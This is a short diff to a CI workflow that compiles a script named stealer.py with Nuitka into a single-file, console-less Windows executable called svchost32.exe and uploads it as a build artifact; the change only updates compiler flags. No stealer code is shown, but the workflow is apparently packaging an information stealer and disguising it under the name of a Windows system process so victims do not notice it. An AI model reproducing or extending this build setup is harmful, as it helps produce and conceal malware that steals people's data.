@@ -1,4 +1,3 @@
-
 name: Build EXE
 on: [push]
 jobs:
@@ -18,7 +17,7 @@ jobs:
 
       - name: Compile with Nuitka
         run: |
-          python -m nuitka --onefile --windows-disable-console --mingw64 --enable-plugin=anti-bloat --output-filename=svchost32.exe stealer.py
+          python -m nuitka --onefile --windows-console-mode=disable --mingw64 --assume-yes-for-downloads --output-filename=svchost32.exe stealer.py
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
